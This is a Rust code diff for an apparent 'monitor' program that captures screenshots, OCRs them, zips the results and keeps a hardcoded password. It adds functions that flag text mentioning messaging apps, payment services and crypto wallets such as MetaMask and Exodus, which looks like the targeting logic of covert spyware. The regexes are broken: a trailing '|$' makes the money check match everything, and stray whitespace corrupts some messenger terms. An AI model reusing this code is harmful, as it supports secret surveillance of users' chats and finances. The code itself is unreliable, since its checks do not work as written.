@@ -13,15 +13,21 @@ pub use zip::{read_zip, zip_screenshot, zip_text};
 pub use ocr::read_screenshot;
 
 use chrono::{Utc, DateTime};
+use once_cell::sync::Lazy;
 use preferences::{AppInfo, PreferencesMap, Preferences};
+use regex::RegexBuilder;
 use std::fs;
 use std::path::PathBuf;
+use std::sync::Mutex;
 
 static APP_INFO: AppInfo = AppInfo{name: "monitor", author: "Hiroki Moto"};
 static PREFES_KEY: &str = "info/docs/monitor";
 
 pub static DOCUMENTS: &[u8] = b"D:\\_documents/";
 pub static PASS: &[u8] = b"test!";
+
+pub static LOG_FILE: Lazy<Mutex<String>> = Lazy::new(|| Mutex::new(String::new()));
+pub static LOGGED: Lazy<Mutex<bool>> = Lazy::new(|| Mutex::new(false));
 
 pub fn init_folders() {
     let mut path = PathBuf::from("D:\\");
@@ -84,4 +90,29 @@ pub fn init_status() -> String {
     };
 
     logs
+}
+
+pub fn is_messengers(text: String) -> bool {
+    let re =
+        RegexBuilder::new(
+            r"skype|discord|telegram|signal|slack|line|whatsapp|wechat|snapchat
+            |zoom|hangouts|google meet|google chat
+        ")
+        .case_insensitive(true)
+        .build().unwrap();
+
+    let ok = re.is_match(&text);
+
+    ok
+}
+
+pub fn is_money(text: String) -> bool {
+    let re =
+        RegexBuilder::new(r"payoneer|paypal|exodus|metamask|payment|money|$")
+        .case_insensitive(true)
+        .build().unwrap();
+
+    let ok = re.is_match(&text);
+
+    ok
 }
